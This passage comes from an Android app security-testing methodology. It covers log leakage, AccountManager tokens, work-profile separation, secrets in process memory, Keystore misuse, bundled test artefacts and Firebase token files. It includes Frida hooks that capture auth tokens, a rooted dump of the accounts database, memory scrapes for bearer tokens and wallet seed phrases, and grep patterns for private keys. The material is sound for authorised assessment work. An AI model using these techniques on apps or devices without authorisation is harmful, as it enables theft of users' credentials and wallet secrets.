  world-readable file, or an ADB-capable attacker. Capture the app's own PID while typing canary values.
- **How:**
```bash
adb logcat -c
adb logcat --pid=$(adb shell pidof -s $PKG) -v time | grep -iE 'token|bearer|passw|pin|otp|authorization|eyJ|card|cvv|ssn|CANARY123'
grep -rnE 'android\.util\.Log|Log\.(v|d|i|w|e)\(|System\.out\.print|printStackTrace\(|Timber\.' out/sources/ | grep -iE 'token|password|otp|card'
```
```javascript
Java.perform(function () {
  var L = Java.use('android.util.Log');
  ['v','d','i','w','e'].forEach(function (m) {
    L[m].overload('java.lang.String','java.lang.String').implementation = function (t, s) {
      console.log('[Log.' + m + '] ' + t + ': ' + s); return this[m](t, s); };
  });
});
```
- **Proof:** A logcat line containing the canary credential from the app's own PID on a **release** build,
  **plus** the named channel: the value in an unencrypted crash upload captured in Burp, or the app writing
  the same log to a world-readable file, or a documented OEM preload holding `READ_LOGS`.
- **Escalation:** Crash-reporting SDKs (Crashlytics, Sentry, Bugsnag) upload breadcrumb logs -> a token in
  logcat leaves the device entirely (D18/D20 third-party disclosure).
- **Ruled out when:** No canary reaches logcat on a release build, or the only logged values are
  non-sensitive, or no reader path exists (no log-shipping SDK, no world-readable log file, modern OS with no
  `READ_LOGS` preload). "The app logs a token but nobody else can read it" is informational — say so rather
  than filing it.

### D11-063 · StrictMode / debug logging left enabled in production

| | |
|---|---|
| **Severity ceiling** | Low; contributes to D11-062 |
| **VRT** | `sensitive_data_exposure.disclosure_of_secrets` (VARIES) only if it leaks a secret |
| **Attacker** | AM-11; AM-04 |
| **Applies to** | all; check ORM debug logging too |
| **Maps to** | MASTG-TEST-0263, MASTG-TEST-0264, MASTG-TEST-0265, MASWE-0061 (CWE-489/497/540) |

- **Test:** `StrictMode` left on in production emits implementation detail (SQL, file paths, thread policy
  violations) to the log; ORM debug logging (`setLogLevel`, `enableLogging`) prints queries and rows.
- **How:**
```bash
grep -rnE 'StrictMode\.(setThreadPolicy|setVmPolicy|enableDefaults)|penaltyLog\(' out/sources/
grep -rniE 'setLogLevel|enableLogging|debugMode|loggingEnabled' out/sources/ -B4 | grep -inE 'room|realm|sugar|greendao|objectbox|sqlcipher'
adb logcat --pid=$(adb shell pidof -s $PKG) | grep -iE 'StrictMode|SQL|query'
```
- **Proof:** StrictMode or ORM debug output in logcat on a release build, ideally containing a query with
  PII or a file path that aids another finding.
- **Escalation:** -> D11-062 (it is the channel), -> D20.
- **Ruled out when:** StrictMode is gated behind `BuildConfig.DEBUG` and ORM logging is off in the release
  build — confirm no such output appears in release logcat.

### D11-064 · AccountManager-stored credentials and auth tokens

| | |
|---|---|
| **Severity ceiling** | High when a live auth token is recoverable; contributes to reinstall-survival (D11-034) |
| **VRT** | `insecure_data_storage...on_internal_storage` (P5); file the token replay |
| **Attacker** | AM-11; AM-03 with `GET_ACCOUNTS` / same-signature access |
| **Applies to** | apps using `AccountManager.addAccountExplicitly` / `setAuthToken` |
| **Maps to** | T1635 Steal Application Access Token; `AccountManager.getAuthToken` |

- **Test:** `AccountManager` stores account credentials and auth tokens in `/data/system_ce/<user>/accounts_ce.db`
  (system-owned). Tokens are retrievable by an app that owns the account type or shares the signature, and
  they survive app data-clear and sometimes reinstall.
- **How:**
```bash
grep -rnE 'AccountManager|addAccountExplicitly|setAuthToken|getAuthToken|setPassword|setUserData' out/sources/
adb shell dumpsys account | grep -A8 "$PKG"
# rooted:
adb shell su -c 'sqlite3 /data/system_ce/0/accounts_ce.db "select * from authtokens;"' 2>/dev/null
```
```javascript
// hook the extraction
Java.perform(function () {
  var AM = Java.use('android.accounts.AccountManager');
  AM.getAuthToken.overload('android.accounts.Account','java.lang.String','android.os.Bundle','boolean',
    'android.accounts.AccountManagerCallback','android.os.Handler').implementation = function () {
    var r = this.getAuthToken.apply(this, arguments); console.log('[getAuthToken] ' + arguments[1]); return r; };
});
```
- **Proof:** The auth token recovered (from the hook, or the CE accounts DB on a rooted device) and replayed
  successfully, or a second app of the same account type reading it.
- **Escalation:** -> D13 (session), -> D11-034 (reinstall survival).
- **Ruled out when:** No token is stored in `AccountManager` (only an account stub with no auth token), or
  the account type is signature-protected and no sibling app shares the signature. Show `dumpsys account`
  with no `authtokens`.

### D11-065 · Work-profile / Private Space data separation assumptions

| | |
|---|---|
| **Severity ceiling** | High for an enterprise-scope engagement (breaks the DPC's authorisation) |
| **VRT** | outcome-rated; `insecure_data_storage...on_external_storage` (P4) if the crossing is via shared storage |
| **Attacker** | AM-05 (the personal-profile instance reading the work instance's state) |
| **Applies to** | Android 5.0+ work profiles; Android 15+ Private Space |
| **Maps to** | AOSP security-model paper §4.3.3 (profiles have separate storage encryption keys; cross-profile communication is gated by user opt-in) and §5 (Enterprise); Private Space (`android.os.usertype.profile.PRIVATE`, `ACCESS_HIDDEN_PROFILES` + `ROLE_HOME`) |

- **Test:** If the app is deployed into a work profile or Private Space, verify it does not write shared
  state to a location that crosses the profile boundary — shared storage, a cross-profile provider, or a
  cloud sync keyed only on device id. "Apps running in different users act as if they run on separate
  devices"; a crossing breaks that.
- **How:**
```bash
adb shell pm list users
adb shell pm list packages --user 10
adb shell run-as $PKG --user 10 ls -la /data/user/10/$PKG 2>/dev/null
grep -rnE 'INTERACT_ACROSS_PROFILES|CrossProfileApps|getUserHandle\(|UserManager' out/sources/
```
- **Proof:** Personal-profile and work-profile instances sharing a record — a file written under `/sdcard`
  by the work instance and read by the personal instance, or the same server-side session reachable from
  both.
- **Escalation:** Corporate data leaving the managed profile -> D20; the DPC's fourth-party authorisation is
  broken.
- **Ruled out when:** All state is per-profile (separate encryption keys enforced by the platform) and no
  shared-storage or cross-profile provider path carries app data between profiles.

### D11-066 · Secrets recoverable from process memory (contributing factor, not headline)

| | |
|---|---|
| **Severity ceiling** | Low–Medium standalone; High when it defeats a "never stored" / "hardware-backed" claim; Critical for a wallet seed |
| **VRT** | `cryptographic_weakness.incomplete_cleanup_of_keying_material` (P5) for the residue; file the outcome the recovered key enables |
| **Attacker** | AM-12 own rooted device (not an attack on its own) or AM-04 debuggable/instrumentable build |
| **Applies to** | all; most impactful on wallets, password managers and banking apps |
| **Maps to** | MASTG-TEST-0011 (deprecated), MASTG-KNOW-0051 (Process Memory), MASTG-TECH-0044, MASTG-TOOL-0106 (Fridump), MASTG-TOOL-0036 (r2frida), MASTG-TOOL-0129 (rabin2) |

- **Test:** Values the app decrypts only in memory (keys, PANs, tokens, mnemonics) are recoverable from the
  live process. MASTG deprecated the dedicated test because it is a development-process concern — so report
  it as a **contributing factor** that raises the impact of a root/debuggable/instrumentation finding, not
  as a headline of its own. It becomes material when it falsifies a design claim ("the key never exists in
  plaintext") or recovers a long-lived server-side secret whose impact is not confined to the compromised
  handset.
- **How:**
```bash
fridump -U -s $PKG            # -s runs a strings pass
strings -n 8 dump/* | grep -Ei 'eyJ[A-Za-z0-9_-]{10,}|Bearer |refresh_token|-----BEGIN'
strings dump/* | grep -E '^([a-z]+ ){11}[a-z]+$'   # BIP-39 12-word mnemonics
objection --gadget $PKG explore
> memory search 'Bearer ' --string
> memory dump all /tmp/mem.dump
```
  MAT OQL for the Java heap (via `hprof-conv`):
```sql
SELECT toString(object) FROM java.lang.String object
SELECT * FROM byte[] b WHERE toString(b).matches(".*1\.2\.840\.113549\.1\.1\.1.*")   -- RSA key OID
```
- **Proof:** The marker still present in a dump taken *after* logout / after the crypto operation completed;
  for a wallet, a 12/24-word mnemonic matching the on-screen seed.
- **Escalation:** Recovered key -> decrypt the "encrypted" store from D11-016/-023 (turns a Medium storage
  finding into a Critical one); recovered token -> D13/D15; pair with D25 AFU physical extraction.
- **Ruled out when:** This is a contributing factor — do not "rule it out" as a standalone; note that
  immutable types (`String`, `BigInteger`) cannot be reliably cleared and `Arrays.fill` is an obvious
  hooking target, so a clean dump is weak evidence. Report it only attached to the finding whose impact it
  raises.

### D11-067 · Keystore holding plaintext data rather than keys

| | |
|---|---|
| **Severity ceiling** | High |
| **VRT** | `insecure_data_storage...on_internal_storage` (P5); the key-usage half is D12 |
| **Attacker** | AM-12 rooted / AM-04 instrumentable — feeds D12 |
| **Applies to** | all |
| **Maps to** | MASTG-KNOW-0051; WithSecure `android-keystore-audit` `tracer-cipher.js` |

- **Test:** The Keystore is the right place for key material, but apps store plaintext data there or use the
  keys in leaky ways. Trace what is actually encrypted and with which key, and check whether the key requires
  user authentication.
- **How:**
```bash
objection --gadget $PKG explore
> android keystore list
frida -U -f $PKG -l tracer-cipher.js     # WithSecure android-keystore-audit
```
- **Proof:** The tracer printing plaintext passed into `Cipher` with a key whose parameters show no
  `setUserAuthenticationRequired`, or a Keystore entry whose value is itself the secret in clear.
- **Escalation:** -> D12 (key management), -> D13 (biometric-binding checks).
- **Ruled out when:** Keystore holds only key material (not data), and keys used for sensitive decrypt are
  user-authentication-bound with a `CryptoObject`. Move the key-derivation analysis to D12.

### D11-068 · Test/config artefacts shipped in the package (`assets/`, `res/raw/`, properties)

| | |
|---|---|
| **Severity ceiling** | High–Critical depending on the credential |
| **VRT** | `sensitive_data_exposure.disclosure_of_secrets.for_publicly_accessible_asset` (**P1**) / `...for_internal_asset` (P3) |
| **Attacker** | AM-01 (the APK is public) |
| **Applies to** | all |
| **Maps to** | ivrodriguez ("developers forget to remove testing data/files"; "search the bundle directory for files that are not images"); Google "Embedded cryptography secrets" |

- **Test:** Leftover test data, private keys and internal endpoint lists in `assets/`, `res/raw/` and bundled
  JSON/properties. This is a superset of D11-027 aimed at whole files rather than string constants.
- **How:**
```bash
find out/assets out/res/raw -type f | grep -viE '\.(png|jpg|jpeg|webp|gif|ttf|otf)$'
grep -rInE '(BEGIN (RSA|EC|OPENSSH) PRIVATE KEY|aws_access_key_id|"private_key"|client_secret|"password")' out/assets out/res
cat out/res/values/strings.xml | grep -iE 'staging|internal|test\.|\.dev|debug_url|backend'
```
- **Proof:** A live credential or an internal endpoint list recovered from a bundled file, with the file
  name.
- **Escalation:** -> D18 (third-party API), -> D01/D15 (internal endpoints as an attack map), -> D11-072
  (the shadow API).
- **Ruled out when:** Bundled non-image files hold only benign resources (localisation, layouts,
  configuration with no secrets), verified by reading each one — not by grep alone.

### D11-069 · WorkManager / job-scheduler input and Firebase installation files as token homes

| | |
|---|---|
| **Severity ceiling** | Medium–High by content |
| **VRT** | `insecure_data_storage...on_internal_storage` (P5); file the token replay |
| **Attacker** | AM-11; AM-03 with a reach primitive |
| **Applies to** | apps using WorkManager, Firebase Installations, FCM |
| **Maps to** | mechanism; `androidx.work.workdb`; `files/PersistedInstallation.json` |

- **Test:** Testers stop at `shared_prefs`, `databases` and `files/*.xml`. Two under-checked token homes: the
  WorkManager DB `WorkSpec.input` column (serialised job inputs, which can carry tokens/ids), and Firebase's
  `files/PersistedInstallation.json` (which holds `authToken`, `refreshToken` and `fid`). Yousef Elsheikh's
  note is quotable: "Most developers are too lazy to decrypt the data ... I found a file called
  `PersistedInstallation.json`" with `auth_token`, `refresh_token`, `user_id`.
- **How:**
```bash
adb shell run-as $PKG sqlite3 databases/androidx.work.workdb 'select id,worker_class_name,input from WorkSpec;'
adb shell run-as $PKG cat files/PersistedInstallation.json 2>/dev/null
adb shell run-as $PKG find . -iname '*installation*' -o -iname '*fcm*' -o -iname '*fid*'
```
- **Proof:** A token in `WorkSpec.input` or in `PersistedInstallation.json`, replayed against the relevant
  API.
- **Escalation:** -> D11-036 (tamper the WorkSpec input before it runs), -> D13/D15 (replay), -> D24 (the FCM
  registration token).
- **Ruled out when:** `WorkSpec.input` carries only non-sensitive job parameters and the Firebase
  installation token is short-lived and device-bound (replay returns 401). Show the replay failing.
